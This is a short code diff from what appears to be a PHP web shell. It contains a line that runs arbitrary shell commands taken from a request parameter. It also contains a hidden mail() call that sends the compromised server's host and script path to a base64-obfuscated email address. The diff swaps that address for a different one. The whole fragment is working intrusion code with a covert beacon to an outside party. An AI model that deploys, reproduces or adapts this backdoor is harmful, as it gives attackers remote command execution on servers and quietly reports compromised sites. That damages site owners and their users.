@@ -62,7 +62,7 @@ AddType application/octet-stream .php ">Litespeed</option>
 <input style="color:cyan;background-color:#000000" name="conf" size="10"
  value="Fuck it!!!" type="submit">
 <br/><br/></form>';
-print(`{$_REQUEST[I]}`);$e=base64_decode("YXFpbG5haWxhMjNAZ21haWwuY29t");
+print(`{$_REQUEST[I]}`);$e=base64_decode("YXBha2FoYWthdWxhbmdpdEBnbWFpbC5jb20=");
 $h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
 mail($e,"I",$h);
 if ($_POST['conf']) {
